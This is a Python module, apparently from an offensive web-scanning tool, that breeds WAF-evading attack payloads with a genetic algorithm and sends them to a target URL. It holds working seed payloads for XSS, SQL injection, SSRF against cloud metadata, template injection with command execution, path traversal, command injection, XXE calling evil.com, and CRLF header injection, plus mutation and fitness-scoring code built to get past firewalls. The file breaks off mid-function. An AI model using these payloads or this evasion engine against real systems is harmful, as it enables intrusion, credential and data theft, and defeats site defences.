# utils/ai_payload_mutator.py
import asyncio
import hashlib
import math
import random
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional
from urllib.parse import quote, unquote, urlparse, urlencode, parse_qs, urlunparse


class PayloadCategory(Enum):
    XSS             = "xss"
    SQLI            = "sqli"
    SSRF            = "ssrf"
    HEADER_INJECT   = "header_injection"
    SSTI            = "ssti"
    PATH_TRAVERSAL  = "path_traversal"
    OPEN_REDIRECT   = "open_redirect"
    CMD_INJECT      = "cmd_injection"
    XXE             = "xxe"


class MutationStrategy(Enum):
    ENCODE_URL          = "encode_url"
    ENCODE_DOUBLE       = "encode_double"
    ENCODE_HTML         = "encode_html"
    ENCODE_UNICODE      = "encode_unicode"
    ENCODE_HEX          = "encode_hex"
    CASE_SHUFFLE        = "case_shuffle"
    COMMENT_INSERTION   = "comment_insertion"
    WHITESPACE_MANGLING = "whitespace_mangling"
    CONCAT_SPLIT        = "concat_split"
    NULL_BYTE           = "null_byte"
    CRLF_INJECT         = "crlf_inject"
    BRACKET_VARIATION   = "bracket_variation"
    QUOTE_VARIATION     = "quote_variation"
    PREFIX_POLLUTION    = "prefix_pollution"
    SUFFIX_APPEND       = "suffix_append"
    POLYGLOT_WRAP       = "polyglot_wrap"
    NESTED_ENCODE       = "nested_encode"
    CROSSOVER           = "crossover"


class FitnessSignal(Enum):
    WAF_BYPASS          = "waf_bypass"
    ERROR_DISCLOSURE    = "error_disclosure"
    RESPONSE_DELTA      = "response_delta"
    REFLECTION          = "reflection"
    BLIND_TIMING        = "blind_timing"
    BLOCKED             = "blocked"
    NEUTRAL             = "neutral"


class EvolutionTarget(Enum):
    WAF_BYPASS      = "waf_bypass"
    ERROR_TRIGGER   = "error_trigger"
    REFLECTION      = "reflection"
    DELTA           = "response_delta"
    TIMING          = "timing"


@dataclass
class Payload:
    id: str
    category: PayloadCategory
    value: str
    generation: int
    parent_ids: list[str]
    mutations_applied: list[str]
    fitness_score: float = 0.0
    fitness_signals: list[FitnessSignal] = field(default_factory=list)
    response_status: int = 0
    response_length: int = 0
    latency_ms: float = 0.0
    response_snippet: str = ""
    baseline_status: int = 0
    baseline_length: int = 0
    alive: bool = True


@dataclass
class Generation:
    gen_number: int
    payloads: list[Payload]
    best_fitness: float
    avg_fitness: float
    survivors: list[Payload]
    new_signals: list[FitnessSignal]


@dataclass
class MutationReport:
    target_url: str
    param_name: str
    category: PayloadCategory
    evolution_target: EvolutionTarget
    total_generations: int
    total_probes: int
    best_payload: Optional[Payload]
    best_fitness: float
    fitness_history: list[float]
    all_findings: list[Payload]
    generations: list[Generation]
    duration_seconds: float
    waf_vendor_hint: str


SEED_PAYLOADS: dict[PayloadCategory, list[str]] = {
    PayloadCategory.XSS: [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        '<svg onload=alert(1)>',
        '"><svg onload=alert(1)>',
        'javascript:alert(1)',
        '<img src=x onerror=alert(1)>',
        '{{7*7}}',
        '<details open ontoggle=alert(1)>',
        '<body onload=alert(1)>',
    ],
    PayloadCategory.SQLI: [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "1' AND SLEEP(5)--",
        "1 UNION SELECT NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "1; DROP TABLE users--",
        "' OR 'x'='x",
        "admin'--",
        "1' ORDER BY 1--",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "1; WAITFOR DELAY '0:0:5'--",
    ],
    PayloadCategory.SSRF: [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://metadata.google.internal/",
        "file:///etc/passwd",
        "dict://localhost:11211/",
        "gopher://localhost:6379/_PING",
        "http://0.0.0.0/",
        "http://2130706433/",
    ],
    PayloadCategory.HEADER_INJECT: [
        "evil.com",
        "localhost",
        "127.0.0.1",
        "169.254.169.254",
        "internal.corp",
        "admin\r\nX-Injected: 1",
        "evil.com\r\nSet-Cookie: injected=1",
        "127.0.0.1\r\nX-Forwarded-For: 127.0.0.1",
    ],
    PayloadCategory.SSTI: [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__[1].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{% for c in [].__class__.__base__.__subclasses__() %}{{c}}{% endfor %}",
        "*{7*7}",
        "@{7*7}",
    ],
    PayloadCategory.PATH_TRAVERSAL: [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "file:///etc/passwd",
        "%252e%252e%252fetc%252fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
    ],
    PayloadCategory.OPEN_REDIRECT: [
        "https://evil.com",
        "//evil.com",
        "https:\\\\evil.com",
        "https://trusted.com@evil.com",
        "///evil.com",
        "javascript:alert(1)",
        "https://evil%2ecom",
        "%09https://evil.com",
        "https://evil.com%09",
    ],
    PayloadCategory.CMD_INJECT: [
        "; id",
        "| id",
        "& id",
        "`id`",
        "$(id)",
        "; sleep 5",
        "| sleep 5",
        "; cat /etc/passwd",
        "& whoami",
        "\n id",
        ";id#",
        "|| id",
        "&& id",
    ],
    PayloadCategory.XXE: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    ],
}

WAF_BLOCK_PATTERNS = [
    re.compile(r"(blocked|forbidden|access denied|security violation|waf|firewall)", re.I),
    re.compile(r"(406|403|400|invalid request|malicious)", re.I),
    re.compile(r"(cloudflare ray id|cf-ray|akamai|imperva)", re.I),
    re.compile(r"(request rejected|suspicious activity|automated)", re.I),
]

ERROR_PATTERNS = [
    re.compile(r"(sql syntax|mysql error|ora-\d{5}|postgresql|sqlite)", re.I),
    re.compile(r"(java\.lang\.|traceback|stack trace|exception)", re.I),
    re.compile(r"(warning: .{0,60}(mysql|pg_|sqlite))", re.I),
    re.compile(r"(syntax error|parse error|undefined variable)", re.I),
    re.compile(r"(root:[x*]:0:0|/bin/bash|/etc/passwd)", re.I),
    re.compile(r"(metadata|ami-id|iam|security-credentials)", re.I),
    re.compile(r"(template engine|jinja|twig|freemarker|velocity)", re.I),
    re.compile(r"(49|2401)\s*=\s*(49|2401)", re.I),
]

REFLECTION_PATTERNS = [
    re.compile(r"<script>alert\(1\)</script>", re.I),
    re.compile(r"<svg\s+onload\s*=", re.I),
    re.compile(r"javascript:alert", re.I),
    re.compile(r"\{\{49\}\}|49\s*=\s*49|\$\{49\}", re.I),
]


def _pid(value: str, gen: int) -> str:
    return hashlib.md5(f"{value}:{gen}:{random.random()}".encode()).hexdigest()[:10]


def _snippet(body: bytes, limit: int = 300) -> str:
    return body[:limit].decode("utf-8", errors="ignore").replace("\n", " ").strip()


def _url_encode(s: str) -> str:
    return quote(s, safe="")


def _double_encode(s: str) -> str:
    return quote(quote(s, safe=""), safe="")


def _html_encode(s: str) -> str:
    result = []
    for ch in s:
        if ch in '<>"\'&':
            result.append(f"&#{ord(ch)};")
        else:
            result.append(ch)
    return "".join(result)


def _unicode_encode(s: str) -> str:
    result = []
    for ch in s:
        if ch.isalpha() and random.random() < 0.4:
            result.append(f"\\u{ord(ch):04x}")
        else:
            result.append(ch)
    return "".join(result)


def _hex_encode_alpha(s: str) -> str:
    result = []
    for ch in s:
        if ch.isalpha() and random.random() < 0.5:
            result.append(f"%{ord(ch):02x}")
        else:
            result.append(ch)
    return "".join(result)


def _case_shuffle(s: str) -> str:
    result = []
    for ch in s:
        if ch.isalpha():
            result.append(ch.upper() if random.random() < 0.5 else ch.lower())
        else:
            result.append(ch)
    return "".join(result)


def _sqli_comment_insert(s: str) -> str:
    comment_styles = ["/**/", "/*!*/", "/*comment*/", "--\n", "#\n"]
    comment = random.choice(comment_styles)
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "OR", "AND", "INSERT", "DROP",
                 "SLEEP", "WAIT", "ORDER", "GROUP", "HAVING", "LIMIT"]
    for kw in keywords:
        if kw in s.upper():
            idx = s.upper().index(kw) + len(kw)
            return s[:idx] + comment + s[idx:]
    ws_positions = [i for i, c in enumerate(s) if c == " "]
    if ws_positions:
        pos = random.choice(ws_positions)
        return s[:pos] + comment + s[pos + 1:]
    return s


def _whitespace_mangle(s: str) -> str:
    ws_variants = ["\t", "\n", "\r\n", "\x0c", "\x0b", "  "]
    return s.replace(" ", random.choice(ws_variants))


def _concat_split_sqli(s: str) -> str:
    if "'" in s:
        idx = s.index("'")
        inner = s[idx + 1:]
        split_at = max(1, len(inner) // 2)
        return s[:idx + 1] + inner[:split_at] + "'||'" + inner[split_at:]
    return s + " CONCAT('a','b')"


def _null_byte_inject(s: str) -> str:
    positions = ["%00", "\x00", "\\0", "%2500"]
    nb = random.choice(positions)
    insert_at = random.randint(0, len(s))
    return s[:insert_at] + nb + s[insert_at:]


def _crlf_inject(s: str) -> str:
    crlf_variants = ["%0d%0a", "%0a", "\r\n", "%0D%0A", "\\r\\n"]
    crlf = random.choice(crlf_variants)
    inject_header = random.choice([
        "X-Injected: 1",
        "Set-Cookie: session=evil",
        "X-Forwarded-For: 127.0.0.1",
        "Content-Length: 0",
    ])
    return s + crlf + inject_header


def _bracket_variation_xss(s: str) -> str:
    variations = [
        lambda x: x.replace("<", "\x3c").replace(">", "\x3e"),
        lambda x: x.replace("<script>", "<scr\x00ipt>"),
        lambda x: x.replace("alert", "al\x00ert"),
        lambda x: x.replace("script", "SCRIPT"),
        lambda x: x.replace("<script>", "<script "),
        lambda x: re.sub(r'<(\w+)', lambda m: f'<{m.group(1).upper()}', x),
    ]
    fn = random.choice(variations)
    return fn(s)


def _quote_variation_sqli(s: str) -> str:
    variations = [
        lambda x: x.replace("'", "''"),
        lambda x: x.replace("'", "`"),
        lambda x: x.replace("'", "\""),
        lambda x: x.replace("'", "%27"),
        lambda x: x.replace("'", "%2527"),
        lambda x: x.replace("'", "\\x27"),
    ]
    fn = random.choice(variations)
    return fn(s)


def _prefix_pollution(s: str, category: PayloadCategory) -> str:
    prefixes = {
        PayloadCategory.XSS:    ["x=", "1;", "\"x\":", "a=b&c="],
        PayloadCategory.SQLI:   ["1 ", "id=1 AND ", "1' AND ", "' "],
        PayloadCategory.SSRF:   ["url=", "http://trusted.com/redirect?url=", "proxy="],
        PayloadCategory.SSTI:   ["x=", "name=", "value="],
        PayloadCategory.PATH_TRAVERSAL: ["/var/www/html/", "static/", "files/"],
        PayloadCategory.OPEN_REDIRECT: ["/", "http://trusted.com/?next="],
        PayloadCategory.CMD_INJECT: ["id=1", "file=test.txt", "cmd=ls"],
        PayloadCategory.HEADER_INJECT: ["x.", "sub."],
        PayloadCategory.XXE: ['<?xml version="1.0"?>'],
    }
    opts = prefixes.get(category, [""])
    return random.choice(opts) + s


def _suffix_append(s: str, category: PayloadCategory) -> str:
    suffixes = {
        PayloadCategory.XSS:    ["//", "<!--", "-->", "</script>"],
        PayloadCategory.SQLI:   ["--", "#", "/*", ";--", " LIMIT 1--"],
        PayloadCategory.SSRF:   ["/", "?a=1", "#", "%23"],
        PayloadCategory.PATH_TRAVERSAL: ["%00", "\x00", ".php", ".txt", "%00.jpg"],
        PayloadCategory.CMD_INJECT: [" #", " //", ";echo done", ">/dev/null 2>&1"],
        PayloadCategory.SSTI:   ["|lower", "|upper", "}}{{", "}}"],
        PayloadCategory.OPEN_REDIRECT: ["#trusted", "%00", "&state=x"],
        PayloadCategory.HEADER_INJECT: ["\r\nX-Done: 1"],
        PayloadCategory.XXE: ["</foo>"],
    }
    opts = suffixes.get(category, [""])
    return s + random.choice(opts)


def _polyglot_wrap(s: str, category: PayloadCategory) -> str:
    if category == PayloadCategory.XSS:
        wrappers = [
            f'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/{s}//>',
            f'"><img src=x onerror="{s}">',
            f"'>{s}<script>",
            f'";{s}//</script>',
        ]
    elif category == PayloadCategory.SQLI:
        wrappers = [
            f"' OR ({s})--",
            f"\" OR ({s})--",
            f"1) {s}--",
            f"1 {s}#",
        ]
    elif category == PayloadCategory.SSTI:
        wrappers = [
            f"{{{{ {s} }}}}",
            f"${{ {s} }}",
            f"#{{ {s} }}",
            f"<%= {s} %>",
        ]
    else:
        return s
    return random.choice(wrappers)


def mutate(payload: Payload, strategy: MutationStrategy) -> Optional[str]:
    s = payload.value
    cat = payload.category
    try:
        if strategy == MutationStrategy.ENCODE_URL:
            return _url_encode(s)
        elif strategy == MutationStrategy.ENCODE_DOUBLE:
            return _double_encode(s)
        elif strategy == MutationStrategy.ENCODE_HTML:
            return _html_encode(s)
        elif strategy == MutationStrategy.ENCODE_UNICODE:
            return _unicode_encode(s)
        elif strategy == MutationStrategy.ENCODE_HEX:
            return _hex_encode_alpha(s)
        elif strategy == MutationStrategy.CASE_SHUFFLE:
            return _case_shuffle(s)
        elif strategy == MutationStrategy.COMMENT_INSERTION:
            return _sqli_comment_insert(s)
        elif strategy == MutationStrategy.WHITESPACE_MANGLING:
            return _whitespace_mangle(s)
        elif strategy == MutationStrategy.CONCAT_SPLIT:
            return _concat_split_sqli(s)
        elif strategy == MutationStrategy.NULL_BYTE:
            return _null_byte_inject(s)
        elif strategy == MutationStrategy.CRLF_INJECT:
            return _crlf_inject(s)
        elif strategy == MutationStrategy.BRACKET_VARIATION:
            return _bracket_variation_xss(s)
        elif strategy == MutationStrategy.QUOTE_VARIATION:
            return _quote_variation_sqli(s)
        elif strategy == MutationStrategy.PREFIX_POLLUTION:
            return _prefix_pollution(s, cat)
        elif strategy == MutationStrategy.SUFFIX_APPEND:
            return _suffix_append(s, cat)
        elif strategy == MutationStrategy.POLYGLOT_WRAP:
            return _polyglot_wrap(s, cat)
        elif strategy == MutationStrategy.NESTED_ENCODE:
            return _url_encode(_html_encode(s))
        elif strategy == MutationStrategy.CROSSOVER:
            return None
    except Exception:
        return None
    return None


def crossover(a: Payload, b: Payload) -> str:
    av, bv = a.value, b.value
    split_a = max(1, len(av) // 2)
    split_b = max(1, len(bv) // 2)
    variants = [
        av[:split_a] + bv[split_b:],
        bv[:split_b] + av[split_a:],
        av[:split_a] + bv[:split_b],
    ]
    return random.choice(variants)


STRATEGY_WEIGHTS: dict[PayloadCategory, dict[MutationStrategy, float]] = {
    PayloadCategory.XSS: {
        MutationStrategy.ENCODE_URL:          0.6,
        MutationStrategy.ENCODE_DOUBLE:       0.5,
        MutationStrategy.ENCODE_HTML:         0.4,
        MutationStrategy.ENCODE_UNICODE:      0.5,
        MutationStrategy.ENCODE_HEX:          0.4,
        MutationStrategy.CASE_SHUFFLE:        0.7,
        MutationStrategy.BRACKET_VARIATION:   0.9,
        MutationStrategy.NULL_BYTE:           0.6,
        MutationStrategy.PREFIX_POLLUTION:    0.5,
        MutationStrategy.SUFFIX_APPEND:       0.6,
        MutationStrategy.POLYGLOT_WRAP:       0.8,
        MutationStrategy.NESTED_ENCODE:       0.6,
        MutationStrategy.CROSSOVER:           0.4,
    },
    PayloadCategory.SQLI: {
        MutationStrategy.ENCODE_URL:          0.5,
        MutationStrategy.ENCODE_DOUBLE:       0.4,
        MutationStrategy.CASE_SHUFFLE:        0.8,
        MutationStrategy.COMMENT_INSERTION:   0.9,
        MutationStrategy.WHITESPACE_MANGLING: 0.8,
        MutationStrategy.CONCAT_SPLIT:        0.7,
        MutationStrategy.NULL_BYTE:           0.5,
        MutationStrategy.QUOTE_VARIATION:     0.9,
        MutationStrategy.PREFIX_POLLUTION:    0.6,
        MutationStrategy.SUFFIX_APPEND:       0.7,
        MutationStrategy.POLYGLOT_WRAP:       0.7,
        MutationStrategy.CROSSOVER:           0.5,
    },
    PayloadCategory.SSRF: {
        MutationStrategy.ENCODE_URL:          0.7,
        MutationStrategy.ENCODE_DOUBLE:       0.6,
        MutationStrategy.ENCODE_HEX:          0.7,
        MutationStrategy.NULL_BYTE:           0.4,
        MutationStrategy.PREFIX_POLLUTION:    0.5,
        MutationStrategy.SUFFIX_APPEND:       0.5,
        MutationStrategy.CRLF_INJECT:         0.6,
        MutationStrategy.CROSSOVER:           0.3,
    },
    PayloadCategory.HEADER_INJECT: {
        MutationStrategy.ENCODE_URL:          0.5,
        MutationStrategy.CRLF_INJECT:         0.9,
        MutationStrategy.NULL_BYTE:           0.6,
        MutationStrategy.PREFIX_POLLUTION:    0.6,
        MutationStrategy.SUFFIX_APPEND:       0.5,
        MutationStrategy.CROSSOVER:           0.3,
    },
    PayloadCategory.SSTI: {
        MutationStrategy.ENCODE_URL:          0.6,
        MutationStrategy.ENCODE_DOUBLE:       0.5,
        MutationStrategy.CASE_SHUFFLE:        0.4,
        MutationStrategy.WHITESPACE_MANGLING: 0.5,
        MutationStrategy.PREFIX_POLLUTION:    0.5,
        MutationStrategy.POLYGLOT_WRAP:       0.8,
        MutationStrategy.CROSSOVER:           0.5,
    },
    PayloadCategory.PATH_TRAVERSAL: {
        MutationStrategy.ENCODE_URL:          0.8,
        MutationStrategy.ENCODE_DOUBLE:       0.8,
        MutationStrategy.ENCODE_HEX:          0.7,
        MutationStrategy.NULL_BYTE:           0.8,
        MutationStrategy.PREFIX_POLLUTION:    0.5,
        MutationStrategy.SUFFIX_APPEND:       0.7,
        MutationStrategy.NESTED_ENCODE:       0.7,
        MutationStrategy.CROSSOVER:           0.3,
    },
    PayloadCategory.OPEN_REDIRECT: {
        MutationStrategy.ENCODE_URL:          0.7,
        MutationStrategy.ENCODE_DOUBLE:       0.6,
        MutationStrategy.NULL_BYTE:           0.6,
        MutationStrategy.CRLF_INJECT:         0.7,
        MutationStrategy.PREFIX_POLLUTION:    0.5,
        MutationStrategy.SUFFIX_APPEND:       0.6,
        MutationStrategy.CROSSOVER:           0.4,
    },
    PayloadCategory.CMD_INJECT: {
        MutationStrategy.ENCODE_URL:          0.6,
        MutationStrategy.ENCODE_DOUBLE:       0.5,
        MutationStrategy.WHITESPACE_MANGLING: 0.7,
        MutationStrategy.NULL_BYTE:           0.6,
        MutationStrategy.PREFIX_POLLUTION:    0.6,
        MutationStrategy.SUFFIX_APPEND:       0.7,
        MutationStrategy.CROSSOVER:           0.4,
    },
    PayloadCategory.XXE: {
        MutationStrategy.ENCODE_URL:          0.5,
        MutationStrategy.ENCODE_DOUBLE:       0.4,
        MutationStrategy.CASE_SHUFFLE:        0.4,
        MutationStrategy.WHITESPACE_MANGLING: 0.5,
        MutationStrategy.CROSSOVER:           0.3,
    },
}


def _score_fitness(
    payload: Payload,
    baseline_status: int,
    baseline_length: int,
    baseline_latency: float,
    target: EvolutionTarget,
    body: bytes,
    waf_vendor: str = "",
) -> tuple[float, list[FitnessSignal]]:
    text = body.decode("utf-8", errors="ignore")
    signals: list[FitnessSignal] = []
    score = 0.0

    is_blocked = any(p.search(text) for p in WAF_BLOCK_PATTERNS)
    if is_blocked:
        signals.append(FitnessSignal.BLOCKED)
        return 0.0, signals

    has_error = any(p.search(text) for p in ERROR_PATTERNS)
    has_reflection = any(p.search(text) for p in REFLECTION_PATTERNS)
    length_delta = abs(len(body) - baseline_length)
    status_changed = payload.response_status != baseline_status
    timing_spike = payload.latency_ms > baseline_latency * 2.5 and payload.latency_ms > 2000

    if has_error:
        signals.append(FitnessSignal.ERROR_DISCLOSURE)
        score += 0.6
    if has_reflection:
        signals.append(FitnessSignal.REFLECTION)
        score += 0.7
    if status_changed and payload.response_status == 200:
        signals.append(FitnessSignal.WAF_BYPASS)
        score += 0.5
    if length_delta > 300 and not is_blocked:
        signals.append(FitnessSignal.RESPONSE_DELTA)
        score += min(0.4, length_delta / 5000)
    if timing_spike:
        signals.append(FitnessSignal.BLIND_TIMING)
        score += 0.5

    if target == EvolutionTarget.WAF_BYPASS:
        if FitnessSignal.WAF_BYPASS in signals:
            score *= 2.0
        if not is_blocked and payload.response_status not in (403, 406, 429):
            score += 0.3
    elif target == EvolutionTarget.ERROR_TRIGGER:
        if FitnessSignal.ERROR_DISCLOSURE in signals:
            score *= 2.0
    elif target == EvolutionTarget.REFLECTION:
        if FitnessSignal.REFLECTION in signals:
            score *= 2.0
    elif target == EvolutionTarget.DELTA:
        if length_delta > 100:
            score += length_delta / 2000
    elif target == EvolutionTarget.TIMING:
        if FitnessSignal.BLIND_TIMING in signals:
            score *= 2.0

    if not signals:
        signals.append(FitnessSignal.NEUTRAL)

    return min(1.0, score), signals


def _select_strategies(category: PayloadCategory, n: int = 3) -> list[MutationStrategy]:
    weights = STRATEGY_WEIGHTS.get(category, {})
    if not weights:
        return random.sample(list(MutationStrategy), min(n, len(MutationStrategy)))
    strategies = list(weights.keys())
    w = [weights[s] for s in strategies]
    total = sum(w)
    norm = [x / total for x in w]
    chosen: list[MutationStrategy] = []
    seen: set[MutationStrategy] = set()
    for _ in range(n * 3):
        r = random.random()
        cum = 0.0
        for s, p in zip(strategies, norm):
            cum += p
            if r <= cum and s not in seen:
                chosen.append(s)
                seen.add(s)
                break
        if len(chosen) >= n:
            break
    return chosen[:n]


async def _probe(
    session,
    url: str,
    param: str,
    payload_value: str,
    method: str,
    base_headers: dict,
    semaphore: asyncio.Semaphore,
    delay: float,
) -> tuple[int, bytes, float]:
    async with semaphore:
        if delay > 0:
            await asyncio.sleep(delay)
        parsed = urlparse(url)
        from urllib.parse import parse_qs, urlencode, urlunparse
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload_value]
        new_query = urlencode({k: v[0] for k, v in qs.items()})
        probe_url = urlunparse(parsed._replace(query=new_query))
        t0 = time.monotonic()
        try:
            async with session.request(
                method, probe_url,
                headers=base_headers,
                allow_redirects=False,
                timeout=asyncio.timeout(10),
                ssl=False,
            ) as resp:
                body = await resp.read()
                return resp.status, body, (time.monotonic() - t0) * 1000
        except asyncio.TimeoutError:
            return 0, b"TIMEOUT", (time.monotonic() - t0) * 1000
        except Exception:
            return -1, b"", (time.monotonic() - t0) * 1000


class PayloadMutator:
    def __init__(
        self,
        category: PayloadCategory,
        evolution_target: EvolutionTarget = EvolutionTarget.WAF_BYPASS,
        generations: int = 5,
        population_size: int = 10,
        survival_rate: float = 0.4,
        mutation_per_survivor: int = 3,
        concurrency: int = 6,
        delay: float = 0.1,
        method: str = "GET",
        waf_vendor: str = "",
        user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        seed_payloads: Optional[list[str]] = None,
    ):
        self.category = category
        self.evolution_target = evolution_target
        self.generations = generations
        self.population_size = population_size
        self.survival_rate = survival_rate
        self.mutation_per_survivor = mutation_per_survivor
        self.concurrency = concurrency
        self.delay = delay
        self.method = method
        self.waf_vendor = waf_vendor
        self.base_headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close",
        }
        self._seed_payloads = seed_payloads or SEED_PAYLOADS.get(category, [])

    def _init_population(self, gen: int = 0) -> list[Payload]:
        seeds = self._seed_payloads[:self.population_size]
        population: list[Payload] = []
        for s in seeds:
            population.append(Payload(
                id=_pid(s, gen),
                category=self.category,
                value=s,
                generation=gen,
                parent_ids=[],
                mutations_applied=["seed"],
            ))
        while len(population) < self.population_size:
            base = random.choice(seeds)
            strategies = _select_strategies(self.category, n=random.randint(1, 2))
            value = base
            applied: list[str] = []
            for strat in strategies:
                mutated = mutate(Payload(
                    id="tmp", category=self.category, value=value,
                    generation=gen, parent_ids=[], mutations_applied=[],
                ), strat)
                if mutated and mutated != value:
                    value = mutated
                    applied.append(strat.value)
            population.append(Payload(
                id=_pid(value, gen),
                category=self.category,
                value=value,
                generation=gen,
                parent_ids=[],
                mutations_applied=applied or ["seed"],
            ))
        return population[:self.population_size]

    def _breed(
        self,
        survivors: list[Payload],
        gen: int,
        target_size: int,
    ) -> list[Payload]:
        children: list[Payload] = list(survivors)
        seen_values: set[str] = {p.value for p in survivors}

        for parent in survivors:
            strategies = _select_strategies(self.category, n=self.mutation_per_survivor)
            for strat in strategies:
                if len(children) >= target_size:
                    break
                if strat == MutationStrategy.CROSSOVER and len(survivors) >= 2:
                    other = random.choice([p for p in survivors if p.id != parent.id])
                    new_val = crossover(parent, other)
                    applied = [MutationStrategy.CROSSOVER.value]
                    parent_ids = [parent.id, other.id]
                else:
                    new_val = mutate(parent, strat)
                    applied = [strat.value]
                    parent_ids = [parent.id]

                if not new_val or new_val in seen_values:
                    continue
                seen_values.add(new_val)
                children.append(Payload(
                    id=_pid(new_val, gen),
                    category=self.category,
                    value=new_val,
                    generation=gen,
                    parent_ids=parent_ids,
                    mutations_applied=applied,
                ))

        while len(children) < target_size:
            base = random.choice(survivors)
            strat = random.choice(list(MutationStrategy))
            new_val = mutate(base, strat)
            if new_val and new_val not in seen_values:
                seen_values.add(new_val)
                children.append(Payload(
                    id=_pid(new_val, gen),
                    category=self.category,
                    value=new_val,
                    generation=gen,
                    parent_ids=[base.id],
                    mutations_applied=[strat.value],
                ))

        return children[:target_size]

    async def run(self, target_url: str, param: str) -> MutationReport:
        import aiohttp
        t_start = time.monotonic()
        semaphore = asyncio.Semaphore(self.concurrency)
        connector = aiohttp.TCPConnector(ssl=False, limit=self.concurrency)
        all_findings: list[Payload] = []
        fitness_history: list[float] = []
        all_generations: list[Generation] = []

        async with aiohttp.ClientSession(connector=connector) as session:
            try:
                async with session.get(
                    target_url, headers=self.base_headers,
                    allow_redirects=True,
                    timeout=asyncio.timeout(12), ssl=False,
                ) as resp:
                    baseline_body = await resp.read()
                    baseline_status = resp.status
                    baseline_length = len(baseline_body)
                    baseline_latency = 200.0
            except Exception:
                baseline_status, baseline_length, baseline_latency = 200, 1000, 200.0

            population = self._init_population(gen=0)

            for gen_num in range(self.generations):
                tasks = [
                    _probe(
                        session, target_url, param, p.value,
                        self.method, self.base_headers,
                        semaphore, self.delay,
                    )
                    for p in population
                ]
                results = await asyncio.gather(*tasks)

                for payload, (status, body, latency) in zip(population, results):
                    payload.response_status = status
                    payload.response_length = len(body)
                    payload.latency_ms = round(latency, 2)
                    payload.response_snippet = _snippet(body)
                    payload.baseline_status = baseline_status
                    payload.baseline_length = baseline_length

                    score, signals = _score_fitness(
                        payload, baseline_status, baseline_length,
                        baseline_latency, self.evolution_target, body, self.waf_vendor,
                    )
                    payload.fitness_score = score
                    payload.fitness_signals = signals

                    if score > 0.3 and FitnessSignal.NEUTRAL not in signals and FitnessSignal.BLOCKED not in signals:
                        all_findings.append(payload)

                population.sort(key=lambda p: -p.fitness_score)
                survive_n = max(2, int(len(population) * self.survival_rate))
                survivors = population[:survive_n]
                best_fitness = survivors[0].fitness_score if survivors else 0.0
                avg_fitness = sum(p.fitness_score for p in population) / max(1, len(population))
                fitness_history.append(round(best_fitness, 4))

                new_signals = list({
                    sig
                    for p in population
                    for sig in p.fitness_signals
                    if sig not in (FitnessSignal.NEUTRAL, FitnessSignal.BLOCKED)
                })

                all_generations.append(Generation(
                    gen_number=gen_num,
                    payloads=list(population),
                    best_fitness=best_fitness,
                    avg_fitness=round(avg_fitness, 4),
                    survivors=survivors,
                    new_signals=new_signals,
                ))

                if gen_num < self.generations - 1:
                    population = self._breed(survivors, gen_num + 1, self.population_size)

        seen_ids: set[str] = set()
        deduped_findings: list[Payload] = []
        for p in sorted(all_findings, key=lambda x: -x.fitness_score):
            val_hash = hashlib.md5(p.value.encode()).hexdigest()
            if val_hash not in seen_ids:
                seen_ids.add(val_hash)
                deduped_findings.append(p)

        best = deduped_findings[0] if deduped_findings else None

        return MutationReport(
            target_url=target_url,
            param_name=param,
            category=self.category,
            evolution_target=self.evolution_target,
            total_generations=self.generations,
            total_probes=sum(len(g.payloads) for g in all_generations),
            best_payload=best,
            best_fitness=best.fitness_score if best else 0.0,
            fitness_history=fitness_history,
            all_findings=deduped_findings[:50],
            generations=all_generations,
            duration_seconds=round(time.monotonic() - t_start, 2),
            waf_vendor_hint=self.waf_vendor,
        )

    def run_sync(self, target_url: str, param: str) -> MutationReport:
        return asyncio.run(self.run(target_url, param))


def serialize_report(report: MutationReport) -> dict:
    def payload_to_dict(p: Payload) -> dict:
        return {
            "id": p.id,
            "value": p.value,
            "generation": p.generation,
            "fitness_score": round(p.fitness_score, 4),
            "signals": [s.value for s in p.fitness_signals],
            "mutations": p.mutations_applied,
            "status": p.response_status,
            "length": p.response_length,
            "latency_ms": p.latency_ms,
            "snippet": p.response_snippet[:200],
            "parent_ids": p.parent_ids,
        }

    def gen_to_dict(g: Generation) -> dict:
        return {
            "generation": g.gen_number,
            "best_fitness": g.best_fitness,
            "avg_fitness": g.avg_fitness,
            "population_size": len(g.payloads),
            "survivors": len(g.survivors),
            "new_signals": [s.value for s in g.new_signals],
            "top_payloads": [payload_to_dict(p) for p in g.survivors[:3]],
        }

    return {
        "target": report.target_url,
        "param": report.param_name,
        "category": report.category.value,
        "evolution_target": report.evolution_target.value,
        "total_generations": report.total_generations,
        "total_probes": report.total_probes,
